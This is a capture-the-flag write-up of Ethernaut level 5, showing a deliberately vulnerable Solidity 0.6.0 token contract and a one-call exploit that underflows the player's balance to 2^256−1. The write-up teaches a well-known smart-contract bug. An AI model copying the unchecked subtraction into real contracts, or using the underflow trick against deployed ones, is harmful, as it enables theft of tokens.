# Level 5: Token

This is the level 5 of [Ethernaut](https://ethernaut.openzeppelin.com/) game.

## Pre-requisites
- Integer [overflow/underflow](https://docs.soliditylang.org/en/v0.6.0/security-considerations.html#two-s-complement-underflows-overflows) in Solidity `v0.6.0`

## Hack

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

`player` is initially assigned 20 tokens i.e. `balances[player] = 20` and has to somehow get any additional tokens (so that `balances[player] > 20` ).

The `transfer` method of `Token` performs some unchecked arithmetic operations on `uint256` (`uint` is shorthand for `uint256` in solidity) integers. That is prone to underflow.

The max value of a 256 bit unsigned integer can represent is `2^256 − 1`, which is - 

```
115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,935
```

Hence `uint256` can only comprise values from `0` to `2^256 - 1` only. Any addition/subtraction would cause overflow/underflow. For example:
```
Let M = 2^256 - 1 (max value of uint256)

0 - 1 = M

M + 1 = 0

20 - 21 = M

(All numbers are 256-bit unsigned integers)
```

We're going to use last expression from example above to exploit the contract.

Let's call `transfer` with a zero address (or any address other than `player`) as `_to` and 21 as `_value` to transfer.

```javascript
await contract.transfer('0x0000000000000000000000000000000000000000', 21)
```

Here's how arithmetics of function would go:

The `require` check below would evaluate to true.
```
require(balances[msg.sender] - _value >= 0);
```

Because `balances[msg.sender] = 20` and `_value = 21`, hence
```
balances[msg.sender] - _value = 2^256 - 1 >= 0
```
due to underflow.

Next statement deducts `_value` amount from `player` address. At this point `balances[msg.sender] = 20` and `_value = 21`. Again an underflow:
```
balances[msg.sender] -= _value;
```
is same as
```
balances[msg.sender] = balances[msg.sender] - _value;
```

And so,
```
balances[msg.sender] = 20 - 21 = 2^256 - 1
```

Whoa! now the `player` (or `msg.sender`) has  `balances[msg.sender]` = `2^256 - 1` number of tokens!!!

Last statement just sets balance of a zero address to `_value` i.e. 21, which we couldn't care less about.

And that's it! `player` has acquired humongous no. of tokens, even way way way more than `totalSupply`. Verify by:
```javascript
await contract.balanceOf(player).then(v => v.toString())
// Output: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
```

A nice thing to note is that it worked because contract's compiler version is `v0.6.0`. This, most probably, **won't work for latest version** (`v0.8.0` as of writing) because underflow/overflow causes failing assertion by default in latest version.



